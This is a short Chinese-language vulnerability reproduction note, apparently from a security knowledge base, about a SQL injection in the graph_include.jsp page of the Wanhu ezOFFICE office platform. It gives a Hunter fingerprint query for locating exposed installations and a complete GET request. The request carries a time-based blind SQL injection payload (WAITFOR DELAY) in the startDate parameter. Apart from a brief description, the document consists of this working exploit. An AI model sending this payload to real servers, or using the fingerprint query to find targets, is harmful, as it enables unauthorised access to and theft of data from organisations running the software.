# DecryptionAppDecryptionApp一、漏洞简介
万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台ezoffice graph_include存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息。
# 二、影响版本

- 万户ezoffice
# 三、资产测绘

- hunter`app.name="万户 Ezoffice OA"`
- 登录页面

![image.png](https://cdn.nlark.com/yuque/0/2023/png/1622799/1694241158110-8d4eef16-79f1-46eb-899b-344bd2a7a19f.png#averageHue=%238c9cbd&clientId=u768d3813-985e-4&from=paste&height=897&id=uf94ce35f&originHeight=1794&originWidth=3524&originalType=binary&ratio=2&rotation=0&showTitle=false&size=4235609&status=done&style=none&taskId=ud366b4c7-85a6-4b59-8bdc-09b6dfd680e&title=&width=1762)
# 四、漏洞复现
```
GET /defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%2000:00:00.000%27%20as%20datetime)%20group%20by%20t.emp_id,t.empname%20)%20%20s%20group%20by%20empname%20order%20by%20num%20desc%20%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Connection: close
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1622799/1723391972495-1bed6cfc-9355-45ce-b70c-e82de987329e.png#averageHue=%2389abc2&clientId=u83a5d5ab-7ef2-4&from=paste&height=527&id=u339badea&originHeight=1054&originWidth=2392&originalType=binary&ratio=2&rotation=0&showTitle=false&size=442437&status=done&style=none&taskId=u26d4b95e-a118-4d0f-baca-79f683b7180&title=&width=1196)
